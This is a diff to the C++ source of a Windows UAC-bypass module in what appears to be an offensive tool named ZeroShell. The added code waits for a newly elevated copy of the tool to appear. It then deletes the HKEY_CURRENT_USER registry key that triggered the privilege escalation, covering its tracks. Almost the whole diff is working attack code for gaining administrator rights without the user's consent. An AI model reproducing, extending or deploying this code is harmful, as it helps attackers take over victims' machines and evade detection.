@@ -4,6 +4,76 @@
 #include <windows.h>
 #include <sstream>
 #include <conio.h>
+#include <tlhelp32.h>
+
+// -------- helpers to detect new elevated ZeroShell process --------
+
+static bool isProcessElevated(HANDLE hProcess) {
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
+        return false;
+    TOKEN_ELEVATION elev;
+    DWORD size = sizeof(elev);
+    GetTokenInformation(hToken, TokenElevation, &elev, size, &size);
+    CloseHandle(hToken);
+    return elev.TokenIsElevated != 0;
+}
+
+// Wait for a new elevated ZeroShell process (different PID) to appear,
+// then clean up registry and exit.
+static void waitForNewElevatedProcess(const std::string& regPath, DWORD currentPid) {
+    std::cout << "[*] Waiting for new elevated process to appear...\n";
+
+    char selfPath[MAX_PATH];
+    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+    // Extract filename only
+    std::string selfName(selfPath);
+    size_t lastSlash = selfName.find_last_of("\\/");
+    if (lastSlash != std::string::npos)
+        selfName = selfName.substr(lastSlash + 1);
+
+    for (int attempt = 0; attempt < 60; ++attempt) { // 30 seconds max
+        Sleep(500);
+
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap == INVALID_HANDLE_VALUE) continue;
+
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(pe);
+
+        bool found = false;
+        if (Process32First(snap, &pe)) {
+            do {
+                if (pe.th32ProcessID != currentPid &&
+                    _wcsicmp(pe.szExeFile, std::wstring(selfName.begin(), selfName.end()).c_str()) == 0) {
+                    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
+                    if (hProc) {
+                        if (isProcessElevated(hProc)) {
+                            CloseHandle(hProc);
+                            found = true;
+                            break;
+                        }
+                        CloseHandle(hProc);
+                    }
+                }
+            } while (Process32Next(snap, &pe));
+        }
+        CloseHandle(snap);
+
+        if (found) {
+            std::cout << "[+] New elevated process detected.\n";
+            // Give it a moment to read the registry
+            Sleep(500);
+            break;
+        }
+    }
+
+    // Clean up registry
+    std::cout << "[*] Cleaning up registry...\n";
+    RegDeleteKeyA(HKEY_CURRENT_USER, regPath.c_str());
+    std::cout << "[+] Registry cleaned. Exiting.\n";
+    exit(0);
+}
 
 std::vector<std::string> UacBypassModule::getCommands() const {
     return { "uac-bypass", "uac-cmd", "uac-run" };
@@ -243,7 +313,6 @@ bool UacBypassModule::bypassUac(const BypassMethod& method, const std::string& c
 
     if (ShellExecuteExA(&sei)) {
         if (sei.hProcess) {
-            WaitForSingleObject(sei.hProcess, 3000);
             CloseHandle(sei.hProcess);
         }
         std::cout << "[+] UAC bypass triggered successfully.\n";
@@ -252,10 +321,15 @@ bool UacBypassModule::bypassUac(const BypassMethod& method, const std::string& c
                   << ". Error: " << GetLastError() << "\n";
     }
 
-    std::cout << "[*] Cleaning up registry...\n";
-    RegDeleteKeyA(HKEY_CURRENT_USER, method.regPath);
-
-    std::cout << "[+] Done.\n";
-    if (exitAfter) exit(0);
+    if (exitAfter) {
+        // Wait for the new elevated ZeroShell process, then clean up and exit
+        waitForNewElevatedProcess(method.regPath, GetCurrentProcessId());
+    } else {
+        // Running a one-off command, wait a bit then clean up
+        Sleep(3000);
+        std::cout << "[*] Cleaning up registry...\n";
+        RegDeleteKeyA(HKEY_CURRENT_USER, method.regPath);
+        std::cout << "[+] Done.\n";
+    }
     return true;
 }
